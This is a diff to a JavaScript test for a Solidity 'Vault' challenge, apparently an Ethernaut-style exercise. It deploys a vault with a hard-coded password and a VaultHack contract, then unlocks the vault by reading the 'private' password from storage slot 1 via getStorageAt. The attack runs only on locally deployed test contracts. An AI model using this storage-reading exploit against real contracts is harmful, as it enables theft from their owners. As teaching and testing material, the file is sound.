@@ -6,18 +6,18 @@ contract("Vault", async (accounts) => {
     let vaultHack;
 
     before(async () => {
-        vault = await Vault.deployed();
-        vaultHack = await VaultHack.deployed();
-    });
-    
-    it("victim should start locked", async () => {
+        // randomized bytes32
+        let password = "0x420fffff69ffffffffff420ffffffff69ffffffffffffffff420ffffffffffff";
+        vault = await Vault.new(password);
+        vaultHack = await VaultHack.new();
+
         let isLocked = await vault.locked.call();
-        assert.equal(isLocked, true, "victim did not start locked");
+        assert.equal(isLocked, true, "victim not initialized correctly");
     });
 
     it("attacker should be able to unlock victim", async () => {
-        let dataSlot = await web3.eth.getStorageAt(Vault.address, 1)
-        await vaultHack.attack(dataSlot);
+        let dataSlot = await web3.eth.getStorageAt(vault.address, 1)
+        await vaultHack.attack(vault.address, dataSlot);
 
         let isLocked = await vault.locked.call();
         assert.equal(isLocked, false, "attacker did not unlock victim");
